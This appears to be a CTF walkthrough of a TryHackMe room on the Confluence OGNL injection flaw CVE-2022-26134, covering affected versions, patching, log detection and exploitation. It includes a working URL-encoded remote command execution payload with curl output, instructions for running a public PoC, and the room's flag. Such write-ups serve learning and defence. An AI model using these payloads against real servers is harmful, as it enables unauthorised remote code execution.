---
weight: 3
title: "CTF writeup - Atlassian CVE-2022-26134"
date: 2022-08-29
lastmod: 2022-08-29T14:16:40+08:00
description: "Another late night CTF on the awesome platform TryHackMe"
featuredImage: "tryhackmebanner.jpg"
hiddenfeaturedImage: false

tags: ["TryHackMe", "CTF", "Linux"]
categories: ["Writeups"]

lightgallery: false
summary: This is a short walkthrough of how to exploit, threat hunt & remediate the Atlassian CVE-2022-26134.
---

# Atlassian, CVE-2022-26134

![Untitled](/atlassian/Untitled.png)

On May the 30th, 2022, an organisation named Volexity identified an un-authenticated RCE vulnerability (scoring 9.8 on NIST) within Atlassian's Confluence Server and Data Center editions.

Confluence is a collaborative documentation and project management framework for teams. Confluence helps track project status by offering a centralised workspace for members.

The following versions of Confluence are vulnerable to this CVE:

```
1.3.0 -> 7.4.17
7.13.0 -> 7.13.7
7.14.0 -> 7.14.3
7.15.0 -> 7.15.2
7.16.0 -> 7.16.4
7.17.0 -> 7.17.4
7.18.0 -> 7.18.1

```

You can view the NIST entry for CVE-2022-26134 [here.](https://nvd.nist.gov/vuln/detail/CVE-2022-26134)

# Login portal

![Untitled](/atlassian/Untitled%201.png)

# Explaining the vulnerability

This CVE uses a vulnerability within the OGNL (Object-Graph Navigation Language) expression language for Java (surprise, surprise ... it's Java). OGNL is used for getting and setting properties of Java objects, amongst many other things.

For example, OGNL is used to bind front-end elements such as text boxes to back-end objects and can be used in Java-based web applications such as Confluence. We can see how OGNL is used in the screenshot below. Values are input to a web form, where these values will be stored into objects within the application:

A web page with questions and a input text field to the right of each question, displaying how values input into a web form can be stored in the back-end using OGNL

![Untitled](/atlassian/Untitled%202.png)

*Thanks to [Journaldev.com](http://journaldev.com/) for this example of OGNL in use.*

We can abuse the fact that OGNL can be modified; we can create a payload to test and check for exploits.

# Patching

Atlassian has released an advisory for their products affected by this CVE, which you can read here. To resolve the issue, you need to upgrade your Confluence version. The suggested list at the time of publication is:

```
7.4.17
7.13.7
7.14.3
7.15.2
7.16.4
7.17.4
7.18.1

```

## Detection - Log Files

Confluence is an Apache Tomcat server which has logging located in /opt/atlassian/confluence/logs. You can use commands like grep to search for HTTP GET requests of payloads that are using Java runtime to execute commands. For example:

```bash
grep -R "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22" in catalina.out

```

## Detection - YARA

If you have Yara installed on the server running Confluence, Volexity (the finders of the vulnerability) has created the following Yara rule for you to use, located here.

Unfamiliar with Yara? Check out the Yara room on TryHackMe [here](https://tryhackme.com/room/yara).

# Exploitation

We can abuse the fact that OGNL can be modified; we can create a payload to test and check for exploits.

In order to exploit this vulnerability within OGNL, we need to make an HTTP GET request and place our payload within the URI. For example, we can instruct the Java runtime to execute a command such as creating a file on the server: 

```bash
${@java.lang.Runtime@getRuntime().exec("touch /tmp/thm/")}/  .
```

This will need to be URL encoded, like the following snippet below. You can use thewebsite [https://www.urlencoder.org/](https://www.urlencoder.org/) to help URL encode your payloads (note that your **curl** payload will need to end in a trailing **/** and not **$2F**):

```bash
┌──(kali㉿kali)-[~]
└─$ curl -v [http://10.10.63.161:8090/%24{%40java.lang.Runtime%40getRuntime().exec("touch /tmp/thm")}/](http://10.10.63.161:8090/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/thm%22%29%7D/)

- Trying 10.10.63.161:8090...
- Connected to 10.10.63.161 (10.10.63.161) port 8090 (#0)

> GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/thm%22%29%7D/ HTTP/1.1
Host: 10.10.63.161:8090
User-Agent: curl/7.84.0
Accept: /
> 
- Mark bundle as not supporting multiuse
< HTTP/1.1 302
< X-ASEN: SEN-L18512764
< X-Confluence-Request-Time: 1661613209991
< Set-Cookie: JSESSIONID=106FD01E12D08A53C9C95A3DBD577ADF; Path=/; HttpOnly
< X-XSS-Protection: 1; mode=block
< X-Content-Type-Options: nosniff
< X-Frame-Options: SAMEORIGIN
< Content-Security-Policy: frame-ancestors 'self'
< Location: /login.action?os_destination=%2F%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch+%2Ftmp%2Fthm%22%29%7D%2Findex.action&permissionViolation=true
< Content-Type: text/html;charset=UTF-8
< Content-Length: 0
< Date: Sat, 27 Aug 2022 15:13:30 GMT
<
- Connection #0 to host 10.10.63.161 left intact
```

When looking at the server, we can see that it is vulnerable:

```bash
cmnatic@thm-cve-2022-26134:~$ ls /tmp
hsperfdata_confluence
thm
snap.lxd
```

The file “thm” was succesfully created.

# Proof of concept

There are a couple of ways we can exploit this. One of them is to download a POC by Samy Younsi (Mwqda) written in Python and hosted on GitHub.

First, we need to download the PoC to our host. I have decided to clone to the repository using git for this room.

```bash
git clone <https://github.com/Nwqda/CVE-2022-26134>
cd CVE-2022-26134

```

After navigating to the source code, let's execute the script. Replace "COMMAND" with the command you wish to execute (Remember to use quotation marks when running commands that have special characters and such.)

```bash
python3.9 cve-2022-26134.py <HTTP://10.10.63.161:8090> COMMAND

```

1. Create a payload to identify what user the application is running as? What is the user?
    1. We can see in the screenshot below that the application is running as the user “confluence”.
    
    ![Untitled](/atlassian/Untitled%203.png)
    
2. Finally, craft a payload to retrieve the flag stored at /flag.txt on the server. What is the flag?
    1. THM{OGNL_VULN}
    
    ![Untitled](/atlassian/Untitled%204.png)
    
    # Conclusion
    
    This was a brief showcase of the [CVE-2022-26134](https://nvd.nist.gov/vuln/detail/CVE-2022-26134) OGNL Injection vulnerability. Remember, OGNL is an expression language for Java-based web applications, so this vulnerability will also apply to other web apps running the same classes that Confluence uses!
    
    ## Additional Reading Material
    
    - [Hunting for Confluence RCE [CVE-2022–26134]](https://medium.com/@th3b3ginn3r/hunting-for-cve-2022-26134-confluence-rce-on-linux-server-ae9ce0176b4a)
    - [Exploring and remediating the Confluence RCE](https://www.datadoghq.com/blog/confluence-vulnerability-overview-and-remediation/)